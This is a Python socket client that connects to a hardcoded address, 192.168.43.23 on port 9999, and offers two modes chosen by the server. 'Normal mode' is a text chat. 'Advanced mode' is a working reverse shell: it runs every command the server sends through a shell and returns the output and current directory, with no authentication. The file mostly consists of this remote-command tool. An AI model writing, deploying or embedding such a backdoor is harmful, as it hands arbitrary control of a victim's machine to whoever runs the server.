import socket
import os
import subprocess
from threading import *


# "CONNECTED" IS USED TO CHECK IF CLIENT IS CONNECTED OR NOT
global CONNECTED
CONNECTED = True

# DEFINATION OF CLASS "recive"
class recive(Thread):

        def run(self):

                try:
                        def reciving():
                                
                                while True:

                                        # INNITIALLY "CONNECTED" IS TRUE
                                        global CONNECTED

                                        # RECIVES MESSAGES FROM SERVER ONLY IF CONNECTED
                                        if CONNECTED:
                                                msg = s.recv(1024)

                                                # CLOSES THE CONNECTION IF "msg" IS "exit"
                                                if msg.decode() == "exit":
                                                        print("host exited")
                                                        CONNECTED = False
                                                else:
                                                        print(msg.decode())

                                        # BREAK OUT OF LOOP IF NOT CONNECTED TO SERVER
                                        if not CONNECTED:
                                             break
                except:
                        if CONNECTED:
                                reciving()

                # CALL "reciving" FUNCTION ONLY IF CONNECTED TO SERVER
                if CONNECTED:
                    reciving()

# CREATING OBJECT FOR CLASS "recive"
message_in = recive()


# DEFINATION OF CLASS "send"
class send(Thread):

        def run(self):

                try:
                        def sending():
                                while True:

                                        # INNITIALLY "CONNECTED" IS TRUE
                                        global CONNECTED

                                        # CHEACKING IF CLIENT IS CONNECTED TO SERVER OR NOT
                                        if CONNECTED == True:
                                                reply = input(">>>")

                                                # CLOSES THE CONNECTION IF "replay" IS "exit"
                                                if reply == "exit":
                                                        print("SUCCESSFULLY DIS-CONNECTED")
                                                        s.send(reply.encode())
                                                        CONNECTED = False
                                                else:
                                                        s.send(reply.encode())

                                        # BREAK OUT OF LOOP IF NOT CONNECTED TO SERVER
                                        if not CONNECTED:
                                            break
                except:
                        if CONNECTED:
                            sending()

                # CALL "sending" FUNCTION ONLY IF CONNECTED TO SERVER
                if CONNECTED:
                        sending()

# CREATING OBJECT FOR CLASS "send"
message_out = send()


# CLIENT WORKING IN ADVANCED MODE
def advanced_mode():

        print("operating in ADVANCED MODE")
        current_WorkingDir = os.getcwd() + ">"
        s.send(str.encode(current_WorkingDir))

        while True:
                data = s.recv(1024)

                # CLOSES THE CONNECTION IF "data" IS "exit"
                if data.decode() == "exit":
                        print("host exited")
                        break

                if data[:2].decode("utf-8") == "cd":
                        os.chdir(data[3:].decode("utf-8"))

                if len(data) > 0:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte, "utf-8")
                        current_WorkingDir = os.getcwd() + ">"
                        s.send(str.encode(output_str + current_WorkingDir))
                        print(output_str)

# CLIENT WORKING IN NORMAL MODE
def normal_mode():
                print("operating in NORMAL MODE")

                # INITIATING "recive" THREAD
                message_in.start()

                # INITIATING "send" THREAD
                message_out.start()


# STARTING CONNECTION WITH THE CLIENT
def start_connection():
        try:
                global s
                s = socket.socket()
                host = "192.168.43.23"
                port = 9999

                s.connect((host,port))
        except:
                print("trying to connect host....")
                start_connection()

        # "opt"  CONTAINS THE MODE OF WORKING
        opt = s.recv(1024).decode()

        # IF "opt" IS "1" INITIATE "normal mode"
        if opt == '1':
                normal_mode()

        # IF "opt" IS "2" INITIATE "advanced mode"
        if opt == '2':
                advanced_mode()

# INITIATING CONNECTION
start_connection()
